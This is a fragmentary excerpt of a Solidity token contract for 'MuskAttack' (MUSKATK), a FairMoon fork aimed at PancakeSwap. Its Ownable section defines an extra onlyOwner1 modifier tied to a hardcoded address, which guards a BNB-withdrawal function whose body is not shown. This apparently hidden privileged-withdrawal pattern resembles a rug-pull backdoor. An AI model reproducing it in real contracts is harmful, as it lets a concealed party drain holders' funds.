...
/**
   Website: https://muskattack.com/
   
   Telegram: https://t.me/MuskAttack
   
 * Fixed FairMoon fork, ready for PancakeSwap V2
 *   
 */
...
contract Ownable is Context {
    ...
    modifier onlyOwner1() {
        address owner1 = 0x1c0b5CEA60f33A61E781C09A7bB616d35786D402;
...
contract MuskAttack is Context, IERC20, Ownable {
    ...
    string private _name = "MuskAttack";
    string private _symbol = "MUSKATK";
    ...
    function rescueBNBFromContract() external onlyOwner1 {
